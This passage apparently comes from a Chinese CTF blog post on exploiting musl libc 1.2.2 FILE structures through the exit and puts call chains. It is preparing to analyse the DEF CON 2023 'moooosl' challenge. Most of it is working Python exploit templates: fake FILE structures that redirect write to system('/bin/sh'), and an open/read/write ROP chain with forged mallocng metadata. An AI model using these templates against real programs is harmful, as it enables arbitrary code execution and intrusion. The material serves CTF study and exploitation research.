FILE *prev_locked, *next_locked;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> __<span class="title">locale_struct</span> *<span class="title">locale</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="exit利用链"><a href="#exit利用链" class="headerlink" title="exit利用链"></a>exit利用链</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">FILE *<span class="keyword">volatile</span> __stdin_used = &amp;__stdin_FILE;</span><br><span class="line">FILE *<span class="keyword">volatile</span> __stdout_used = &amp;__stdout_FILE;</span><br><span class="line">FILE *<span class="keyword">volatile</span> __stderr_used = &amp;__stderr_FILE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">_Noreturn</span> <span class="type">void</span> <span class="title function_">exit</span><span class="params">(<span class="type">int</span> code)</span> &#123;</span><br><span class="line">    __funcs_on_exit();</span><br><span class="line">    __libc_exit_fini();</span><br><span class="line">    __stdio_exit();</span><br><span class="line">    _Exit(code);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __stdio_exit(<span class="type">void</span>) &#123;</span><br><span class="line">    FILE *f;</span><br><span class="line">    <span class="keyword">for</span> (f = *__ofl_lock(); f; f = f-&gt;next) close_file(f);</span><br><span class="line">    close_file(__stdin_used);</span><br><span class="line">    close_file(__stdout_used);</span><br><span class="line">    close_file(__stderr_used);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">close_file</span><span class="params">(FILE *f)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!f) <span class="keyword">return</span>;</span><br><span class="line">    FFINALLOCK(f);</span><br><span class="line">    <span class="keyword">if</span> (f-&gt;wpos != f-&gt;wbase) f-&gt;write(f, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (f-&gt;rpos != f-&gt;rend) f-&gt;seek(f, f-&gt;rpos - f-&gt;rend, SEEK_CUR);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到<code>exit</code>函数最终会调用到三个<code>io file</code>的<code>write</code>函数和<code>seek</code>函数，我们可以将 <code>FILE</code> 结构体开头的几个字节修改为 <code>/bin/sh</code> ，再修改 <code>write</code> 指针的值为 <code>system</code> ，以及修改 <code>f-&gt;wpos</code> 、<code>f-&gt;wbase</code> 中其中之一就可以调用到 <code>system(“/bin/sh”)</code><br>总结来说，就是在无沙箱时，需要修改 <code>_IO_FILE</code> 结构体的几个地方：</p><ul><li>起始位置写入 <code>/bin/sh</code></li><li><code>write</code> 写入 <code>system</code> 函数地址。</li><li>好将 <code>lock</code> 设置为小于 <code>0</code> 避免程序卡死在 <code>__lockfile</code> 函数中。(等于 <code>0</code> 貌似也可以)</li></ul><p>fake_file getshell模板：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">fake_file = <span class="string">b&quot;&quot;</span></span><br><span class="line">fake_file += <span class="string">b&quot;/bin/sh&quot;</span>.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)  <span class="comment"># flags</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rpos</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rend</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># close</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># wend</span></span><br><span class="line">fake_file += p64(<span class="number">0x114514</span>)  <span class="comment"># wpos</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># mustbezero_1</span></span><br><span class="line">fake_file += p64(<span class="number">0x1919810</span>)  <span class="comment"># wbase</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># read</span></span><br><span class="line">fake_file += p64(libc_base+libc.symols[<span class="string">&#x27;system&#x27;</span>])  <span class="comment"># write</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)  <span class="comment"># lock = 0</span></span><br></pre></td></tr></table></figure><p>若需要<code>orw</code>，这需要一下<code>gadget</code>：</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov rsp, qword ptr [rdi + 0x30] ; jmp qword ptr [rdi + 0x38]</span><br></pre></td></tr></table></figure><p>总结来说，就是在有沙箱时，需要修改 <code>_IO_FILE</code> 结构体的 <code>3</code> 个地方：</p><ul><li><code>f-&gt;wbase</code> 写入第一个 <code>gadget</code> 地址使得 <code>f-&gt;wpos 、f-&gt;wbase</code> 不等的同时能够执行到 <code>gadget</code></li><li><code>write</code> 写入刚才提到的栈迁移的 <code>gadget</code></li><li>偏移 <code>0x30</code> 处写入新的栈地址配合栈迁移 <code>gadget</code> 完成栈迁移</li><li>此外还需要在其他地方构造好 <code>ROP</code> 链用于 <code>orw</code></li></ul><p>模板：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">payload_addr = libc.address - <span class="number">0x6fe0</span></span><br><span class="line">fake_file_addr = payload_addr</span><br><span class="line">fake_group_addr = fake_file_addr + <span class="number">0x90</span></span><br><span class="line">fake_chunk_addr = fake_group_addr + <span class="number">0x10</span></span><br><span class="line">fake_meta_area_offset = ((payload_addr + <span class="number">0xFFF</span>) &amp; ~<span class="number">0xFFF</span>) - payload_addr</span><br><span class="line">fake_meta_offset = fake_meta_area_offset + <span class="number">8</span></span><br><span class="line">fake_meta_addr = payload_addr + fake_meta_offset</span><br><span class="line">stderr_used_addr = libc.address + <span class="number">0xb43a0</span></span><br><span class="line">rop_addr = fake_chunk_addr</span><br><span class="line"></span><br><span class="line">magic_gadget = libc.search(asm(<span class="string">&#x27;mov rsp, qword ptr [rdi + 0x30] ; jmp qword ptr [rdi + 0x38]&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">pop_rdi_ret = libc.search(asm(<span class="string">&quot;pop rdi;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">pop_rsi_ret = libc.search(asm(<span class="string">&quot;pop rsi;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">pop_rdx_ret = libc.search(asm(<span class="string">&quot;pop rdx;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">pop_rax_ret = libc.search(asm(<span class="string">&quot;pop rax;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">ret = libc.search(asm(<span class="string">&quot;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">buf_addr = payload_addr</span><br><span class="line"></span><br><span class="line">rop = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">rop += p64(pop_rdi_ret)</span><br><span class="line">rop += p64(buf_addr)</span><br><span class="line">rop += p64(pop_rsi_ret)</span><br><span class="line">rop += p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(libc.sym[<span class="string">&#x27;open&#x27;</span>])</span><br><span class="line">rop += p64(pop_rdi_ret)</span><br><span class="line">rop += p64(<span class="number">3</span>)</span><br><span class="line">rop += p64(pop_rsi_ret)</span><br><span class="line">rop += p64(buf_addr)</span><br><span class="line">rop += p64(pop_rdx_ret)</span><br><span class="line">rop += p64(<span class="number">0x100</span>)</span><br><span class="line">rop += p64(libc.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">rop += p64(pop_rdi_ret)</span><br><span class="line">rop += p64(<span class="number">1</span>)</span><br><span class="line">rop += p64(pop_rsi_ret)</span><br><span class="line">rop += p64(buf_addr)</span><br><span class="line">rop += p64(pop_rdx_ret)</span><br><span class="line">rop += p64(<span class="number">0x100</span>)</span><br><span class="line">rop += p64(libc.sym[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line"></span><br><span class="line">fake_file = <span class="string">b&quot;&quot;</span></span><br><span class="line">fake_file += <span class="string">b&quot;./flag&quot;</span>.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)  <span class="comment"># flags</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rpos</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rend</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># close</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># wend</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># wpos</span></span><br><span class="line">fake_file += p64(rop_addr)  <span class="comment"># mustbezero_1</span></span><br><span class="line">fake_file += p64(ret)  <span class="comment"># wbase</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># read</span></span><br><span class="line">fake_file += p64(magic_gadget)  <span class="comment"># write</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)  <span class="comment"># lock = 0</span></span><br><span class="line"></span><br><span class="line">fake_group = p64(fake_meta_addr) + p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">fake_meta = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_meta += p64(fake_file_addr)  <span class="comment"># prev</span></span><br><span class="line">fake_meta += p64(stderr_used_addr)  <span class="comment"># next</span></span><br><span class="line">fake_meta += p64(fake_group_addr)  <span class="comment"># mem</span></span><br><span class="line">fake_meta += p32(<span class="number">0b0000</span>)  <span class="comment"># avail_mask</span></span><br><span class="line">fake_meta += p32(<span class="number">0b1110</span>)  <span class="comment"># freed_mask</span></span><br><span class="line">last_idx = <span class="number">3</span></span><br><span class="line">freeable = <span class="number">1</span></span><br><span class="line">sizeclass = <span class="number">8</span></span><br><span class="line">maplen = <span class="number">0</span></span><br><span class="line">fake_meta += p64(last_idx | (freeable &lt;&lt; <span class="number">5</span>) | (sizeclass &lt;&lt; <span class="number">6</span>) | (sizeclass &lt;&lt; <span class="number">12</span>))</span><br><span class="line"></span><br><span class="line">fake_meta_area = p64(leak_secret) + fake_meta</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += fake_file</span><br><span class="line">payload += fake_group</span><br><span class="line">payload += rop</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(payload) &lt;= fake_meta_area_offset</span><br><span class="line">payload = payload.ljust(fake_meta_area_offset, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += fake_meta_area</span><br><span class="line">payload = payload.ljust(<span class="number">0x2000</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_node = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_node += p64(<span class="number">4</span>)  <span class="comment"># id</span></span><br><span class="line">fake_node += p64(fake_chunk_addr)  <span class="comment"># name -&gt; fake chunk</span></span><br><span class="line">fake_node += p64(<span class="number">0x100</span>)  <span class="comment"># name_size</span></span><br><span class="line">fake_node += p64(<span class="number">2</span>)  <span class="comment"># type</span></span><br><span class="line">fake_node += p64(<span class="number">0xdeadbeef</span>)  <span class="comment"># fa</span></span><br><span class="line">fake_node += p64(<span class="number">0</span>)  <span class="comment"># ls</span></span><br><span class="line">fake_node += p64(<span class="number">0</span>)  <span class="comment"># rs</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>, fake_node)</span><br><span class="line">add(<span class="number">6</span>, payload)</span><br></pre></td></tr></table></figure><h3 id="puts利用链"><a href="#puts利用链" class="headerlink" title="puts利用链"></a>puts利用链</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">puts</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *s)</span> &#123;</span><br><span class="line">    <span class="type">int</span> r;</span><br><span class="line">    FLOCK(<span class="built_in">stdout</span>);</span><br><span class="line">    r = -(<span class="built_in">fputs</span>(s, <span class="built_in">stdout</span>) &lt; <span class="number">0</span> || putc_unlocked(<span class="string">&#x27;\n&#x27;</span>, <span class="built_in">stdout</span>) &lt; <span class="number">0</span>);</span><br><span class="line">    FUNLOCK(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">fputs</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *<span class="keyword">restrict</span> s, FILE *<span class="keyword">restrict</span> f)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> l = <span class="built_in">strlen</span>(s);</span><br><span class="line">    <span class="keyword">return</span> (fwrite(s, <span class="number">1</span>, l, f) == l) - <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">fwrite</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *<span class="keyword">restrict</span> src, <span class="type">size_t</span> size, <span class="type">size_t</span> nmemb, FILE *<span class="keyword">restrict</span> f)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> k, l = size * nmemb;</span><br><span class="line">    <span class="keyword">if</span> (!size) nmemb = <span class="number">0</span>;</span><br><span class="line">    FLOCK(f);</span><br><span class="line">    k = __fwritex(src, l, f);</span><br><span class="line">    FUNLOCK(f);</span><br><span class="line">    <span class="keyword">return</span> k == l ? nmemb : k / size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> __towrite(FILE *f) &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (f-&gt;flags &amp; F_NOWR) &#123;</span><br><span class="line">        f-&gt;flags |= F_ERR;</span><br><span class="line">        <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> __fwritex(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *<span class="keyword">restrict</span> s, <span class="type">size_t</span> l, FILE *<span class="keyword">restrict</span> f) &#123;</span><br><span class="line">    <span class="type">size_t</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!f-&gt;wend &amp;&amp; __towrite(f)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (l &gt; f-&gt;wend - f-&gt;wpos) <span class="keyword">return</span> f-&gt;write(f, s, l);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>getshell 模板：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">fake_file = <span class="string">b&quot;&quot;</span></span><br><span class="line">fake_file += <span class="string">b&quot;/bin/sh&quot;</span>.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)  <span class="comment"># flags</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rpos</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rend</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># close</span></span><br><span class="line">fake_file += p64(<span class="number">0x114514</span>)  <span class="comment"># wend</span></span><br><span class="line">fake_file += p64(<span class="number">0x114514</span>)  <span class="comment"># wpos</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># mustbezero_1</span></span><br><span class="line">fake_file += p64(<span class="number">0x114514</span>)  <span class="comment"># wbase</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># read</span></span><br><span class="line">fake_file += p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])  <span class="comment"># write</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0x80</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br></pre></td></tr></table></figure><p>orw musl-1.2.2 模板：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">fake_name_addr = libc.address + <span class="number">0xb7990</span></span><br><span class="line">payload_addr = libc.address - <span class="number">0x6fe0</span></span><br><span class="line">fake_file_addr = payload_addr</span><br><span class="line">fake_group_addr = fake_file_addr + <span class="number">0x90</span></span><br><span class="line">fake_chunk_addr = fake_group_addr + <span class="number">0x10</span></span><br><span class="line">fake_meta_area_offset = ((payload_addr + <span class="number">0xFFF</span>) &amp; ~<span class="number">0xFFF</span>) - payload_addr</span><br><span class="line">fake_meta_offset = fake_meta_area_offset + <span class="number">8</span></span><br><span class="line">fake_meta_addr = payload_addr + fake_meta_offset</span><br><span class="line">stderr_used_addr = libc.address + <span class="number">0xb43a0</span></span><br><span class="line">rop_addr = fake_chunk_addr</span><br><span class="line"></span><br><span class="line">magic_gadget = libc.search(asm(<span class="string">&#x27;mov rsp, qword ptr [rdi + 0x30] ; jmp qword ptr [rdi + 0x38]&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">pop_rdi_ret = libc.search(asm(<span class="string">&quot;pop rdi;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">pop_rsi_ret = libc.search(asm(<span class="string">&quot;pop rsi;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">pop_rdx_ret = libc.search(asm(<span class="string">&quot;pop rdx;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">pop_rax_ret = libc.search(asm(<span class="string">&quot;pop rax;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">ret = libc.search(asm(<span class="string">&quot;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">buf_addr = payload_addr</span><br><span class="line"></span><br><span class="line">rop = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">rop += p64(pop_rdi_ret)</span><br><span class="line">rop += p64(buf_addr)</span><br><span class="line">rop += p64(pop_rsi_ret)</span><br><span class="line">rop += p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(libc.sym[<span class="string">&#x27;open&#x27;</span>])</span><br><span class="line">rop += p64(pop_rdi_ret)</span><br><span class="line">rop += p64(<span class="number">3</span>)</span><br><span class="line">rop += p64(pop_rsi_ret)</span><br><span class="line">rop += p64(buf_addr)</span><br><span class="line">rop += p64(pop_rdx_ret)</span><br><span class="line">rop += p64(<span class="number">0x100</span>)</span><br><span class="line">rop += p64(libc.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">rop += p64(pop_rdi_ret)</span><br><span class="line">rop += p64(<span class="number">1</span>)</span><br><span class="line">rop += p64(pop_rsi_ret)</span><br><span class="line">rop += p64(buf_addr)</span><br><span class="line">rop += p64(pop_rdx_ret)</span><br><span class="line">rop += p64(<span class="number">0x100</span>)</span><br><span class="line">rop += p64(libc.sym[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line"></span><br><span class="line">fake_file = <span class="string">b&quot;&quot;</span></span><br><span class="line">fake_file += <span class="string">b&quot;./flag&quot;</span>.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)  <span class="comment"># flags</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rpos</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rend</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># close</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># wend</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># wpos</span></span><br><span class="line">fake_file += p64(rop_addr)  <span class="comment"># mustbezero_1</span></span><br><span class="line">fake_file += p64(ret)  <span class="comment"># wbase</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># read</span></span><br><span class="line">fake_file += p64(magic_gadget)  <span class="comment"># write</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)  <span class="comment"># lock = 0</span></span><br><span class="line"></span><br><span class="line">fake_group = p64(fake_meta_addr) + p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">fake_meta = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_meta += p64(fake_file_addr)  <span class="comment"># prev</span></span><br><span class="line">fake_meta += p64(stderr_used_addr)  <span class="comment"># next</span></span><br><span class="line">fake_meta += p64(fake_group_addr)  <span class="comment"># mem</span></span><br><span class="line">fake_meta += p32(<span class="number">0b0000</span>)  <span class="comment"># avail_mask</span></span><br><span class="line">fake_meta += p32(<span class="number">0b1110</span>)  <span class="comment"># freed_mask</span></span><br><span class="line">last_idx = <span class="number">3</span></span><br><span class="line">freeable = <span class="number">1</span></span><br><span class="line">sizeclass = <span class="number">8</span></span><br><span class="line">maplen = <span class="number">0</span></span><br><span class="line">fake_meta += p64(last_idx | (freeable &lt;&lt; <span class="number">5</span>) | (sizeclass &lt;&lt; <span class="number">6</span>) | (sizeclass &lt;&lt; <span class="number">12</span>))</span><br><span class="line"></span><br><span class="line">fake_meta_area = p64(leak_secret) + fake_meta</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += fake_file</span><br><span class="line">payload += fake_group</span><br><span class="line">payload += rop</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(payload) &lt;= fake_meta_area_offset</span><br><span class="line">payload = payload.ljust(fake_meta_area_offset, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += fake_meta_area</span><br><span class="line">payload = payload.ljust(<span class="number">0x2000</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_node = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_node += p64(fake_name_addr)  <span class="comment"># name_addr</span></span><br><span class="line">fake_node += p64(fake_chunk_addr)  <span class="comment"># content_addr</span></span><br><span class="line">fake_node += p64(<span class="built_in">len</span>(<span class="string">&#x27;fake name&#x27;</span>))  <span class="comment"># name_size</span></span><br><span class="line">fake_node += p64(<span class="number">0</span>)  <span class="comment"># content_size</span></span><br><span class="line">fake_node += p64(<span class="number">0</span>)  <span class="comment"># next</span></span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;hijack node&#x27;</span>.ljust(<span class="number">0x28</span>, <span class="string">b&#x27;\x00&#x27;</span>), fake_node)</span><br><span class="line">add(<span class="string">&quot;payload&quot;</span>, payload)</span><br><span class="line">log.info(<span class="string">&quot;fake chunk addr: &quot;</span> + <span class="built_in">hex</span>(fake_chunk_addr))</span><br></pre></td></tr></table></figure><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>题目为<code>defcon 2023 moooosl</code><br>musl版本为1.2.2</p><h3 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h3><p>赛题好像没有给出源码，不过代码比较简单，<code>ida</code>看的反而比源码更加方便，这里为了方便看的人了解题目，就把源码贴出来了<br>h.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 